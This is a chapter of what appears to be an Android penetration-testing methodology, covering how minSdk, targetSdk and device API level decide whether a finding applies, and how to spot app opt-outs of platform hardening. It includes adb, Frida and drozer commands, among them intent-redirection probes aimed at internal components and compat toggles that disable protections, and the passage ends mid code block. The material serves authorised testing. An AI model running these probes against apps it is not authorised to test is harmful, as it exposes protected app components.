# D22 · Platform & OS Version-Specific Behaviour

> This domain owns almost no bugs of its own. What it owns is the *applicability* of every other
> chapter: two integers (`minSdkVersion`, `targetSdkVersion`) plus the device's API level decide whether
> a finding is a P1, a LEGACY footnote, or a retraction. Its own severity ceiling is Support for the
> version-matrix machinery and genuinely High-to-Critical for the narrow class where the app has
> **explicitly opted out of a platform hardening** — `removeLaunchSecurityProtection()`,
> `ZipPathValidator.clearCallback()`, `intentMatchingFlags="none"`, a re-registered BouncyCastle
> provider, `grantKeyAccess()`, `android:debuggable="true"` on a targetSdk-31+ build.

| | |
|---|---|
| **Phases** | P2 scoping and harness, P4 static analysis, P7 impact conversion, P8 write-up |
| **Milestones** | M2, M4 |
| **VRT ceiling** | The opt-out items reach the consumer domain's rating: `broken_authentication_and_session_management.authentication_bypass` (P1) via D08 redirection, `server_side_injection.remote_code_execution_rce` (P1) via the D17 dynamic-code path, `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) via the backup/extraction path. The domain's own landing zone is `broken_access_control.exposed_sensitive_android_intent` (**priority null — rated on what you demonstrate**). Everything else here is Support and must never be filed alone |
| **Primary attacker model** | AM-03 zero-permission local app for the opt-out items; AM-12 own rooted device for the matrix and compat-toggle machinery, which is **not an attack** and must never be presented as one |
| **Maps to** | MASVS-CODE-1, MASVS-CODE-3, MASVS-PLATFORM-1; MASTG-TEST-0245, MASTG-TEST-0285, MASTG-TEST-0235, MASTG-TEST-0381, MASTG-TEST-0315, MASTG-TEST-0340, MASTG-TEST-0262, MASTG-TEST-0312, MASTG-TEST-0224, MASTG-TEST-0393, MASTG-TEST-0399, MASTG-TEST-0217, MASTG-TEST-0250, MASTG-TEST-0252, MASTG-TEST-0253, MASTG-TEST-0334, MASTG-TEST-0203; MASTG-TECH-0128, MASTG-TECH-0141, MASTG-TECH-0150, MASTG-TECH-0160, MASTG-TECH-0161, MASTG-TECH-0162, MASTG-TECH-0163, MASTG-TECH-0174, MASTG-TECH-0043; rules `mastg-android-sdk-version`, `mastg-android-strictmode`, `mastg-android-pendingintent-mutable`; MASWE-0041, MASWE-0042, MASWE-0046; CWE-693, CWE-1104, CWE-1357, CWE-477, CWE-926, CWE-927; ATT&CK T1633.001, T1632, T1661, T1407, T1418, mitigation M1006 |

## Why this domain pays

It pays negatively, and that is worth more than it sounds. The single largest structural defect the
research corpus found in the public Android checklist literature is stated plainly by the
Indusface/hackwithsingh/riya78 review: **"None of the three sources gate any item by API level. That is
the single largest gap between these checklists and a usable 2026 methodology."** Every circulating
checklist still tells testers to report `MODE_WORLD_READABLE`, `adb backup` extraction, user-CA trust,
implicit component export, sticky broadcasts and the `addJavascriptInterface` reflection RCE as if the
platform had not closed each of them at a specific, knowable API level. A consultancy whose report is
compared against what independent hunters submit cannot afford to file any of those against a
targetSdk-35 app, and equally cannot afford to *drop* one against an app whose `minSdkVersion` is 24.

The positive half is narrower and much more valuable. Every hardening Google shipped between Android 12
and Android 16 came with a documented opt-out, because compatibility demanded one. `Android 16` blocks
nested-intent redirection by default — and ships `Intent.removeLaunchSecurityProtection()`. `Android 14`
blocks zip traversal in `ZipFile`/`ZipInputStream` — and ships `dalvik.system.ZipPathValidator.clearCallback()`.
`Android 16` adds strict intent matching — and ships `android:intentMatchingFlags="none"`, which the
docs state *takes precedence* over the application-level value. `Android 12` removed BouncyCastle — and
nothing stops an app bundling `bcprov` and calling `Security.insertProviderAt(..., 1)`. Each of those is
a one-line grep that finds a developer deliberately restoring a blocked primitive, in an app the client
believes is on a modern platform. That is not a misconfiguration observation; it is the precondition
that makes a D08 or D17 finding land as P1 on a current device.

No source in the corpus gives a base rate for this domain, and that is the honest answer: it has no base
rate because it has no bugs of its own. What it has is a measurable effect on everyone else's — the
corpus repeatedly records the same failure mode from two directions (the Google Mobile VRP excludes
"vulnerabilities that do not work on the latest available operating system version"; Xiaomi excludes
"attacks that are only available in lower versions of Android"; YesWeHack's Gojek programme excludes
verbatim "Exploits that are only possible on Android version 8 and below"). Get the version regime
wrong in the permissive direction and the report is closed for free; get it wrong in the conservative
direction and you never test the class at all.

## The crux question

**For every candidate finding in this engagement: at which `minSdkVersion`, `targetSdkVersion` and
device API level is it actually reachable — and has this app explicitly opted out of the platform
hardening that would otherwise close it?**

## Triage order

1. **Pin the version triplet from the installed package** (D22-001). Thirty seconds, and it decides the
   applicability of roughly sixty items across the other chapters. Nothing else in this chapter is
   meaningful without it.
2. **Grep the six opt-out strings** (D22-052, D22-034, D22-053, D22-017, D22-058, D22-013). These are
   the only items in the chapter that are findings in their own right, and each is a single grep.
3. **Build the version matrix and install on each image** (D22-003). Everything that follows needs two
   API levels to be defensible; building it after you have a PoC wastes the PoC.
4. **Run the mechanical LEGACY/CURRENT verdict** (D22-004) over the candidate list from every other
   domain. This is where you delete the items you were about to waste a day on.
5. **Distinguish a platform block from an app-side check** (D22-005). Run this *before* writing any
   negative result, because a platform refusal proves nothing about the app and will not hold on the
   client's minSdk fleet.
6. **The targetSdk-31/33/34 mandates, audited as choices rather than omissions** (D22-011, D22-012,
   D22-030, D22-031). On a modern target, an insecure value is something a developer typed.
7. **The hardening opt-outs the app inherited from an SDK** (D22-039, D22-029, and the merged-manifest
   route in D22-001). The app's effective posture is the merged manifest, not its own.
8. **Play-layer controls** (D22-063 → D22-069). SafetyNet has been dead since January 2025 and is still
   shipping; that is the cheapest High in this chapter.
9. **The LEGACY block** (D22-070 → D22-077) only if the recorded SDK values put the app on the wrong
   side of a gate. Otherwise these are graveyard entries, not tests.
10. **Reporting discipline** (D22-078 → D22-082) last, but before you submit anything version-dependent.

## Items

### D22-001 · Pin the real min/target/compileSdk triplet from the installed package

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — the gate that decides every other item's applicability |
| **Attacker** | AM-12 (own device; not an attack) |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0141 (Inspecting the Merged AndroidManifest), MASTG-TECH-0150 (Analyzing the AndroidManifest), MASWE-0042; `developer.android.com/about/versions/{12,13,14,15,16}/behavior-changes-*` — every change on those pages is keyed to `targetSdkVersion`, not to the device |

- **Test:** Read `minSdkVersion`, `targetSdkVersion` and `compileSdkVersion` from the **installed** APK
  set and from the package manager, not from the store listing and not from a Gradle file. Split APKs,
  repackaged builds and apktool-decoded manifests all disagree with each other.
- **How:**
  ```bash
  PKG=com.target.app
  adb shell pm path $PKG                       # base.apk plus every split
  for p in $(adb shell pm path $PKG | sed 's/package://' | tr -d '\r'); do adb pull "$p" .; done
  aapt2 dump badging base.apk | grep -E "sdkVersion:|targetSdkVersion:|compileSdkVersion|package: name"
  adb shell dumpsys package $PKG | grep -E 'targetSdk|minSdk|versionName|versionCode|flags=|pkgFlags'
  # apktool frequently DROPS <uses-sdk>; cross-check against apktool.yml, never the decoded manifest alone
  apktool d -f -o out base.apk >/dev/null && grep -E 'minSdkVersion|targetSdkVersion' out/apktool.yml
  # the effective posture is the MERGED manifest, not the app's own source manifest
  apkanalyzer manifest print base.apk > out/AndroidManifest.merged.xml
  ```
  Emit the report header block in the shape the paid HackerOne reports use (H1 #2553411 Basecamp,
  #1737358 Shopify both open with it and both were reproduced by the vendor first try):
  ```
  | Application Name  : <name>
  | Package Name      : com.target.app
  | Version code      : <n>
  | Version Name      : <x.y.z>
  | Minimum SDK       : <n>
  | Target  SDK       : <n>
  | Sha256            : <sha256 of base.apk>
  ```
- **Proof:** Three integers that agree across `aapt2 dump badging`, `dumpsys package` and `apktool.yml`,
  quoted verbatim in the engagement's `inventory/` and repeated next to every version-gated claim.
- **Escalation:** Feeds every other chapter; specifically gates D03 manifest defaults, D07 provider
  export, D08 PendingIntent mutability, D10 WebView setting defaults, D11 backup, D14 CA trust.
- **Ruled out when:** Never — this item is unconditional. It is ruled *complete* when the three sources
  agree; if `apktool.yml` and `dumpsys package` disagree, the package manager wins and you note the
  discrepancy (it usually means you decoded a different split or a store build rather than the installed
  one).

### D22-002 · Record the device's API level, build fingerprint, patch level and Mainline/SDK-extension versions

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — evidence metadata |
| **Attacker** | AM-12 |
| **Applies to** | all |
| **Maps to** | ATT&CK T1633.001 (System Checks — build/system-property reads drive behaviour changes), mitigation M1006 (Use Recent OS Version); `developer.android.com/guide/sdk-extensions` (`SdkExtensions.getExtensionVersion()`, `SdkExtensions.AD_SERVICES`, `android:minExtensionVersion`) |

- **Test:** Half the behaviour changes in Android 12-16 are *device-OS* gated rather than targetSdk
  gated (the Conscrypt trust store, private space, OTP redaction, force-stop PendingIntent cancellation,
  `OWNER_PACKAGE_NAME` redaction). Record the device side of the equation, including the Google Play
  system-update state, because modular APIs ship **below** their nominal API level through SDK
  Extensions and will be present on a device the developer assumed was too old.
- **How:**
  ```bash
  adb shell getprop ro.build.version.sdk
  adb shell getprop ro.build.version.release
  adb shell getprop ro.build.version.security_patch
  adb shell getprop ro.vendor.build.security_patch
  adb shell getprop ro.build.fingerprint
  adb shell getprop | grep build.version.extensions
  #   [build.version.extensions.r]: [3]  [build.version.extensions.s]: [3]  [build.version.extensions.t]: [3]
  adb shell ls /apex | sort                    # which Mainline modules are updatable on this build
  ```
  In the decompiled app, find the runtime gates that consume these:
  ```bash
  grep -rnE 'Build\.VERSION\.SDK_INT|Build\.VERSION_CODES\.|SdkExtensions\.getExtensionVersion\(|SdkExtensions\.AD_SERVICES' out/sources/ | head -40
  grep -n 'minExtensionVersion' out/AndroidManifest.merged.xml
  ```
- **Proof:** A `lab/platform-baseline-API<NN>.txt` file in the evidence tree carrying all seven property
  values and the extension versions, referenced by every version-dependent claim in the report.
  `build.version.extensions.r >= 2` on an Android 11/12 device is positive proof that
  `ACTION_PICK_IMAGES` (Photo Picker) is live there and that the app's "legacy storage fallback" branch
  is reachable on a device the developer believed was modern.
- **Escalation:** Feeds D22-004's verdict, D22-078's preconditions block, and the D26 harness runbook.
- **Ruled out when:** Never — unconditional metadata. Mark it complete when the file exists and the
  security-patch level is later than the fix date of any platform CVE you intend to reference.

### D22-003 · Build the four-image version matrix and install the same build on each

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — harness |
| **Attacker** | AM-12 |
| **Applies to** | all; mandatory whenever the lab's API level changed since the last engagement |
| **Maps to** | `developer.android.com/about/versions/{12,13,14,15,16}/behavior-changes-all`; MASTG-TECH-0128; the YesWeHack Android lab image table (`google_apis` = rootable via `adb root`, no Play Store; `google_apis_playstore` = not rootable, has Play Store; `default`/`aosp` = limited root) |

- **Test:** A single-device test produces false negatives in one direction and unreportable findings in
  the other. The minimum viable matrix is four images: the app's own `minSdkVersion`, Android 13 (API 33,
  pre-Conscrypt-trust-split, `RECEIVER_*` still optional), Android 15 (API 35, private space, OTP
  redaction, BAL creator opt-in, force-stop PI cancellation) and Android 16 (API 36, intent-redirection
  hardening, `intentMatchingFlags`, local network permission, predictive back).
- **How:**
  ```bash
  sdkmanager --install "platform-tools" "emulator" \
    "system-images;android-33;google_apis;x86_64" \
    "system-images;android-35;google_apis;x86_64" \
    "system-images;android-36;google_apis;x86_64"
  # plus the app's own minSdk, read from D22-001:
  sdkmanager --install "system-images;android-<minSdk>;google_apis;x86_64"
  for A in 33 35 36 <minSdk>; do
    avdmanager create avd -n "a$A" -k "system-images;android-$A;google_apis;x86_64" -d pixel_6 --force
  done
  # google_apis, NOT google_apis_playstore: you need `adb root` to place a CA in the Conscrypt APEX (D22-035)
  ```
  Install and verify on every serial, and **count the rows** — a silent zero here is a failed loop, not a
  clean result (shell array expansion fails silently; if you expected four lines and got two, the loop
  ate something):
  ```bash
  adb devices -l
  for S in $(adb devices | awk '/device$/{print $1}'); do
    API=$(adb -s "$S" shell getprop ro.build.version.sdk | tr -d '\r')
    adb -s "$S" install-multiple base.apk split_*.apk >/dev/null 2>&1 || adb -s "$S" install -r base.apk
    printf '%s\tAPI=%s\tinstalled=%s\n' "$S" "$API" \
      "$(adb -s "$S" shell pm path com.target.app | wc -l | tr -d ' ')"
  done | tee lab/version-matrix.txt
  wc -l lab/version-matrix.txt        # must equal the number of images you started
  ```
- **Proof:** `lab/version-matrix.txt` with one row per image, each showing a non-zero installed-path
  count and the API level. Any image where the install fails with
  `INSTALL_FAILED_DEPRECATED_SDK_VERSION` is itself a recorded result (see D22-041).
- **Escalation:** Every PoC in the engagement is re-run across this matrix before it is written up.
- **Ruled out when:** The client's supported device population is a single API level and they have
  supplied the distribution data to prove it — in which case you record that data and test the one
  level. "I only had one emulator" is not a ruling-out mechanism.

### D22-004 · Emit a mechanical LEGACY/CURRENT verdict for every candidate finding

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — rating qualifier |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0245 (References to Platform Version APIs), MASWE-0041 (Running on a Recent Platform Version Not Ensured — CWE-693, CWE-1104, CWE-1357), MASWE-0042 (Latest Platform Version Not Targeted), rule `mastg-android-sdk-version`, MASVS-CODE-1 |

- **Test:** Take the candidate list produced by D03-D17 and mark each row CURRENT, LEGACY-live (the gate
  is open because the app's declared SDK range puts it on the permissive side) or DEAD. MASTG's rule is
  that security *posture* is evaluated against `minSdkVersion` (the least secure supported environment)
  while *enforcement* behaviours key off `targetSdkVersion` — apply the right one per row.
- **How:** Run the gate emitter with the values from D22-001, then attach its output to the candidate
  table:
  ```bash
  MIN=$(aapt2 dump badging base.apk | grep -oE "sdkVersion:'[0-9]+'" | grep -oE '[0-9]+')
  TGT=$(aapt2 dump badging base.apk | grep -oE "targetSdkVersion:'[0-9]+'" | grep -oE '[0-9]+')
  echo "minSdk=$MIN targetSdk=$TGT"
  [ "$MIN" -lt 17 ] && echo "LEGACY-live: addJavascriptInterface reflection RCE (all public methods callable)"
  [ "$MIN" -lt 24 ] && echo "LEGACY-live: user-added CA store trusted by default -> MitM with no root"
  [ "$TGT" -lt 17 ] && echo "LEGACY-live: <provider> android:exported defaults to TRUE"
  [ "$TGT" -lt 24 ] && echo "LEGACY-live: MODE_WORLD_READABLE/WRITEABLE usable (throws SecurityException at 24+)"
  [ "$TGT" -lt 28 ] && echo "LEGACY-live: cleartext HTTP allowed by default"
  [ "$TGT" -lt 29 ] && echo "LEGACY-live: requestLegacyExternalStorage honoured; native exec from data dir allowed"
  [ "$TGT" -lt 30 ] && echo "LEGACY-live: free package visibility (no <queries> needed); setAllowFileAccess defaults TRUE"
  [ "$TGT" -lt 31 ] && echo "LEGACY-live: intent-filtered components exported implicitly; PendingIntent mutable by default; fullBackupContent form"
  [ "$TGT" -lt 33 ] && echo "LEGACY-live: no POST_NOTIFICATIONS grant needed; untyped getSerializableExtra/getParcelableExtra"
  [ "$TGT" -lt 34 ] && echo "LEGACY-live: implicit intents reach internal components; runtime receivers export by default; DCL files may be writable; zip traversal unvalidated"
  [ "$TGT" -lt 35 ] && echo "LEGACY-live: platform does not enforce TLS>=1.2 for this app; BAL creator opt-in absent"
  [ "$TGT" -lt 36 ] && echo "LEGACY-live: predictive back not default; intentMatchingFlags unavailable"
  ```
  Then re-derive the SELinux domain, which is the same table wearing a different hat — a lower target
  places the process in a versioned domain with a materially wider policy:
  ```bash
  adb shell ps -AZ | grep com.target.app     # u:r:untrusted_app_30:s0:c... etc.
  ```
- **Proof:** The emitted lines, pasted into the engagement's candidate table, with each LEGACY-live row
  paired to a reproduced PoC on the matching image from D22-003. A compounding count is itself worth a
  report line: "the app targets API N and therefore inherits M legacy-permissive defaults", enumerated.
- **Escalation:** LEGACY-live rows go to their owning domain with the gate stated in the "Applies to"
  line. DEAD rows go to this chapter's Graveyard and are never filed.
- **Ruled out when:** `targetSdk >= 36` and `minSdk >= 24` — at which point every row above emits
  nothing and the LEGACY block (D22-070 → D22-077) is closed with the two integers as the mechanism.

### D22-005 · Distinguish a platform block from an app-side check before writing any negative

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — kill gate that prevents both a false negative and a false positive |
| **Attacker** | AM-03 |
| **Applies to** | all; mandatory on every "the app rejected my intent / my payload / my request" observation |
| **Maps to** | `developer.android.com/about/versions/16/behavior-changes-16` (the `PackageManager` logcat filter `tag:PackageManager & (message:"Intent does not match component's intent filter:" \| message:"Access blocked:")`); the bug-hunting corpus's LAYER-ORDERING TRAP |

- **Test:** This is the Android edition of the layer-ordering trap. When your crafted intent, broadcast,
  zip entry or class-load is refused, the refusal came from one of two places: the **platform**, which
  says nothing at all about the app's own validation, or the **app**, which is the thing you were
  testing. If it was the platform, the same payload will land on any device or targetSdk where that
  platform behaviour is absent — which is exactly the client's minSdk fleet. Treating a platform refusal
  as "the app is safe" is how a real finding gets silently skipped.
- **How:** Capture the refusal source, then re-run with the single variable changed. Three separable
  signals:
  ```bash
  adb logcat -c && <the payload> ; adb logcat -d -v time > /tmp/d22_refusal.log
  # (a) platform refusal strings — if any of these appear, the APP never saw your payload:
  grep -nE "Intent does not match component's intent filter:|Access blocked:" /tmp/d22_refusal.log   # A16 matching
  grep -nE "ForegroundServiceStartNotAllowedException"                       /tmp/d22_refusal.log   # A12/14/15 FGS
  grep -nE "Indirect notification activity start \(trampoline\) from"        /tmp/d22_refusal.log   # A12 trampoline
  grep -nE "Untrusted touch due to occlusion by"                             /tmp/d22_refusal.log   # A12 tapjacking
  grep -nE "BAL|Background activity (start|launch).*(blocked|abort)"         /tmp/d22_refusal.log   # A10/14/15 BAL
  grep -nE "ZipException"                                                    /tmp/d22_refusal.log   # A14 zip validator
  grep -nE "is not read-only|dex file.*not.*read-only"                       /tmp/d22_refusal.log   # A14 DCL
  grep -nE "sendto failed: (EPERM|ECONNABORTED)"                             /tmp/d22_refusal.log   # A16 local network
  grep -nE "INSTALL_FAILED_DEPRECATED_SDK_VERSION"                           /tmp/d22_refusal.log   # A14/15 min target
  # (b) app-side refusal: a stack trace inside the app's own package, or a UI error string
  grep -nE "com\.target\.app\..*(Exception|denied|invalid|reject)"           /tmp/d22_refusal.log
  # (c) the single-variable control — turn the platform behaviour off and re-run the identical payload
  adb shell am compat disable <CHANGE_NAME> com.target.app && <the payload>
  ```
- **Proof:** Two runs of the **byte-identical** payload with one variable changed (the compat toggle, or
  the API level), producing two different outcomes, with the platform's own refusal line present in one
  and absent in the other. A byte-identical outcome on both runs means you have not isolated anything —
  that is the Body-Diff Rule applied to Android: a refusal with no source attribution is not a result.
- **Escalation:** If the platform blocked it, the finding is still live on the LEGACY side of the gate —
  re-run on the minSdk image from D22-003 and report with the precondition stated. If the app blocked
  it, that is a true negative for the owning domain and goes in the ruled-out register with the app-side
  stack frame as the mechanism.
- **Ruled out when:** The app's own code frame appears in the refusal stack trace **and** the same
  payload is refused with the relevant compat change disabled and on the minSdk image. Those three
  together are a defensible app-side negative. Any one of them alone is not.

### D22-006 · Diff behaviour across API levels, never response shape

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — evidence standard for every version-gated claim |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | the bug-hunting corpus's Body-Diff Rule and its shadow-API rule (*a version difference alone is Informational; the weakened control is the finding*) |

- **Test:** The shadow-API principle transfers exactly from the backend to the platform. An older API
  level, an older targetSdk or an older APK version is a **different target with the same name**, and the
  reportable thing is never "these differ" — it is the specific control that is weaker on one side.
  Diff four security-relevant behaviours for the same operation across two API levels: does the payload
  land; is it delivered to a component the other level refuses; does the app fall back to a weaker code
  path; does the data that comes back contain fields the other level redacts.
- **How:**
  ```bash
  run_on () {  # $1=serial   $2..=command
    S=$1; shift
    API=$(adb -s "$S" shell getprop ro.build.version.sdk | tr -d '\r')
    echo "===== serial=$S api=$API"
    adb -s "$S" logcat -c
    "$@" 2>&1
    adb -s "$S" logcat -d | grep -E "Access blocked:|ZipException|SecurityException|BAL|Exception" | head -20
  }
  for S in $(adb devices | awk '/device$/{print $1}'); do
    run_on "$S" adb -s "$S" shell am start -n com.target.app/.RedirectActivity --es sub_intent 'intent:#Intent;component=com.target.app/.internal.Secret;end'
  done | tee /tmp/d22_matrix_diff.txt
  grep -c '^=====' /tmp/d22_matrix_diff.txt      # count: must equal your device count
  ```
  Then, for the mobile-to-backend half, diff the **behaviour** of the endpoints the APK hardcodes
  against the version the current web client uses — the corpus's highest-value mobile bridge. Auth
  strength, rate limiting, input validation and field exposure, same operation, both versions.
- **Proof:** A per-API result matrix (serial, API level, `ro.build.fingerprint`, outcome, refusal line)
  in which at least one row differs *in outcome*, not merely in log text. The report sentence is
  "reproduces on API ≤ 35; on API 36 the platform blocks it unless the app calls
  `removeLaunchSecurityProtection()`, which it does/does not."
- **Escalation:** A weaker control on the legacy side is the finding and belongs to the owning domain;
  a version difference with no weakened control is Informational and belongs in the coverage appendix.
- **Ruled out when:** The outcomes are identical across every image in the matrix and the app's own
  refusal frame is present in all of them (see D22-005). Record the matrix, not "it did not work".

### D22-007 · Use `am compat` as the single-variable negative control

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — evidence technique |
| **Attacker** | AM-12 |
| **Applies to** | Android 10+ for the compat framework; the change ID must exist on the build. Some toggles require a debuggable app or a `userdebug` build |
| **Maps to** | `developer.android.com/guide/app-compatibility/test-debug`; the per-version behaviour-change pages, each of which names its own change; MASTG-TECH-0043 |

- **Test:** The compatibility framework flips an individual behaviour change on or off **per package**
  from the shell. That gives you the strongest negative control available on Android: identical input,
  identical grant, one variable, two outcomes. It also demonstrates something the client needs to hear —
  a control that rests solely on a platform behaviour is per-package switchable on a device the user
  controls.
- **How:**
  ```bash
  adb shell am compat                                       # usage
  adb shell dumpsys platform_compat | grep -i com.target.app
  adb shell am compat enable  <CHANGE_NAME_OR_ID> com.target.app
  adb shell am compat disable <CHANGE_NAME_OR_ID> com.target.app
  adb shell am compat reset   <CHANGE_NAME_OR_ID> com.target.app
  ```
  Change names verified in the corpus against their own documentation pages:
  `REQUIRE_EXACT_ALARM_PERMISSION`, `NOTIFICATION_TRAMPOLINE_BLOCK`, `BLOCK_UNTRUSTED_TOUCHES`,
  `FGS_INTRODUCE_TIME_LIMITS`, `FGS_BOOT_COMPLETED_RESTRICTIONS`, `FGS_SAW_RESTRICTIONS`,
  `RESTRICT_LOCAL_NETWORK`, `DETECT_UNSAFE_INTENT_LAUNCH`, `STPE_SKIP_MULTIPLE_MISSED_PERIODIC_TASKS`,
  `DISALLOW_INVALID_GROUP_REFERENCE`, `ENABLE_STRICT_VALIDATION`, and the numeric form used by the
  provider strict-SQL change (`484953293`, `ENFORCE_STRICT_SQL_CHECKS`).
  ```bash
  # numeric form, for a change that has no exported name on this build:
  adb shell am compat enable  484953293 com.target.app
  adb shell am compat disable 484953293 com.target.app
  ```
- **Proof:** Two runs of the same command producing two outcomes — for example data returned versus
  `IllegalArgumentException: Invalid token SELECT` — captured with timestamps. This pair of runs is the
  fourth beat of the PoC video.
- **Escalation:** Feeds D22-005's attribution and D27's evidence standard.
- **Ruled out when:** `dumpsys platform_compat` does not list the change for this build (record the
  output) — then fall back to the two-image matrix in D22-003, which achieves the same isolation more
  slowly.

### D22-008 · Harvest the platform's own refusal strings as evidence artefacts

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — evidence capture |
| **Attacker** | AM-12 |
| **Applies to** | all |
| **Maps to** | the behaviour-change pages that publish each string verbatim: `about/versions/12/behavior-changes-12`, `.../14/behavior-changes-14`, `.../15/behavior-changes-15`, `.../16/behavior-changes-16` |

- **Test:** Each platform mitigation emits a distinctive log line. Collect them once per run; they are
  simultaneously your positive proof ("the block fired, so the app relies on it") and your negative
  proof ("the block did not fire and the payload landed").
- **How:**
  ```bash
  adb logcat -c && adb logcat -v time > /tmp/d22_run.log &
  # ... drive the app / fire the payload ...
  grep -nE "Indirect notification activity start \(trampoline\) from" /tmp/d22_run.log
  grep -nE "Untrusted touch due to occlusion by"                      /tmp/d22_run.log
  grep -nE "Intent does not match component's intent filter:|Access blocked:" /tmp/d22_run.log
  grep -nE "sendto failed: (EPERM|ECONNABORTED)"                      /tmp/d22_run.log
  grep -nE "ForegroundServiceStartNotAllowedException"                /tmp/d22_run.log
  grep -nE "INSTALL_FAILED_DEPRECATED_SDK_VERSION"                    /tmp/d22_run.log
  grep -nE "did not stop within its timeout"                          /tmp/d22_run.log
  grep -nE "StrictMode|UnsafeIntentLaunch"                            /tmp/d22_run.log
  grep -nE "realCallingPackage|callingPackage"                        /tmp/d22_run.log
  grep -nE "Accessing hidden (method|field)|greylist|blacklist|max-target" /tmp/d22_run.log
  # targeted PackageManager filter for the Android 16 matching enforcement:
  adb logcat -s PackageManager | grep -E "Intent does not match component's intent filter:|Access blocked:"
  ```
- **Proof:** The exact strings with timestamps, interleaved with the PoC step log.
- **Escalation:** D22-005 attribution; D22-079 negative proof; D27 evidence pack.
- **Ruled out when:** n/a — this is collection, not a test. It is complete when the log file exists for
  each image in the matrix.

### D22-009 · Inject StrictMode detectors rather than waiting for the app to ship them

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — discovery technique feeding D08/D04 |
| **Attacker** | AM-12 |
| **Applies to** | device API >= 31 for `detectUnsafeIntentLaunch()`; API >= 36 for `detectBlockedBackgroundActivityLaunch()` |
| **Maps to** | rule `mastg-android-strictmode`, MASTG-TECH-0043; `about/versions/12/behavior-changes-12` (unsafe-intent-launch detection), `about/versions/15/behavior-changes-15` (`StrictMode.VmPolicy.Builder().detectUnsafeIntentLaunch()`), `guide/components/activities/background-starts` (`detectBlockedBackgroundActivityLaunch()`, Android 16+) |

- **Test:** The platform ships runtime detectors for two of the classes this chapter gates. Inject them
  into a release build with Frida instead of hoping the developer enabled them; the violation stack
  traces turn a grep hypothesis into a runtime-confirmed call site.
- **How:**
  ```javascript
  // d22_strictmode.js
  Java.perform(function () {
    var B  = Java.use('android.os.StrictMode$VmPolicy$Builder');
    var SM = Java.use('android.os.StrictMode');
    var b  = B.$new().detectUnsafeIntentLaunch().penaltyLog();
    try { b = b.detectBlockedBackgroundActivityLaunch(); } catch (e) { /* pre-36 */ }
    SM.setVmPolicy(b.build());
    console.log('[+] StrictMode detectors armed');
  });
  ```
  ```bash
  frida -U -f com.target.app -l d22_strictmode.js --no-pause
  adb logcat -c && adb logcat -s StrictMode:* | tee /tmp/d22_strictmode.log
  # platform-side alternative on a debuggable build:
  adb shell am compat enable DETECT_UNSAFE_INTENT_LAUNCH com.target.app
  ```
- **Proof:** `StrictMode` violation entries with full stack traces naming the offending
  `startActivity`/`sendBroadcast` call site inside the app's own package.
- **Escalation:** Every violation is a D08 redirection candidate or a D04 background-launch candidate.
- **Ruled out when:** The detectors are armed (the `[+]` line printed), the app is driven through every
  entry point in the D01 inventory, and zero violations are logged. Record the driving script and the
  empty log.

### D22-010 · Verify package-visibility filtering has not silently zeroed your own tooling

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — false-negative control |
| **Attacker** | AM-03 (the attacker app is subject to the same filtering) |
| **Applies to** | attacker/agent app `targetSdk >= 30` on an Android 11+ device |
| **Maps to** | drozer `app.package.list`, `app.package.attacksurface`; MASTG-TOOL-0004 (adb); `training/package-visibility` (filtered APIs `queryIntentActivities()`, `getPackageInfo()`, `getInstalledApplications()`, `resolveActivity()`, `bindService()`) |

- **Test:** On a modern device your own PoC app, drozer agent or enumeration harness may be unable to
  *see* the target package unless it declares `<queries>` or holds `QUERY_ALL_PACKAGES`. The module
  output is then empty, which reads as "no attack surface" and is a false negative in your own tooling,
  not a property of the target.
- **How:**
  ```
  dz> run app.package.list -f com.target
  dz> run app.package.attacksurface com.target.app
  ```
  ```bash
  adb shell pm list packages | grep com.target        # ground truth from the shell UID
  adb shell dumpsys package com.target.app | sed -n '/Activity Resolver Table/,/Service Resolver Table/p'
  ```
  If the shell sees it and the agent does not, rebuild the agent with the needed `<queries>` entry, or
  fall back to `adb`/`dumpsys` enumeration.
- **Proof:** The discrepancy itself — `pm list packages` returning the package while
  `app.package.list -f` returns nothing — recorded before you conclude anything about attack surface.
- **Escalation:** Restores D01 enumeration; also note that filtering changes **discovery, not delivery**
  (see D22-075): an explicit `ComponentName` or a `VIEW` intent still reaches the target with no
  `<queries>` entry at all.
- **Ruled out when:** The agent and `pm list packages` return the same package set, or the agent's
  manifest declares the target in `<queries>`. Record which.

### D22-011 · `android:exported` is mandatory at targetSdk 31 — audit the value chosen, not its absence

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what the component does) |
| **Attacker** | AM-03 |
| **Applies to** | targetSdk >= 31. LEGACY variant (absence is the bug) is D22-070 |
| **Maps to** | `about/versions/12/behavior-changes-12` ("Safer component exporting… App cannot install on Android 12+ devices without this attribute"), `INSTALL_FAILED_VERIFICATION_FAILURE`; `privacy-and-security/risks/android-exported`; MASTG-TECH-0160/0161/0162/0163; MASVS-PLATFORM-1 |

- **Test:** Since Android 12, a component carrying an `<intent-filter>` cannot install without an
  explicit `android:exported`. That kills the old bug class ("they forgot to set it") and creates a new
  one: someone typed `exported="true"` to make the build pass, on a component that was never meant to be
  public. On a modern target, exported is a **decision** — report it with that framing, which is
  materially stronger than "the default is insecure".
- **How:**
  ```bash
  grep -nB2 -A8 'android:exported="true"' out/AndroidManifest.merged.xml
  # the ground truth regardless of what the manifest text implies:
  adb shell dumpsys package com.target.app | sed -n '/Activity Resolver Table/,/Permissions:/p'
  adb shell pm dump com.target.app | grep -iE 'exported|permission='
  # probe each, from the shell UID (not the app's):
  adb shell am start     -n com.target.app/.SomeActivity
  adb shell am start     -a com.target.ACTION_X -n com.target.app/.SomeActivity --es token AAA
  adb shell am startservice -n com.target.app/.SomeService
  adb shell am broadcast -n com.target.app/.SomeReceiver --es payload x
  ```
  If source control is available, the regression is often visible as a commit:
  ```bash
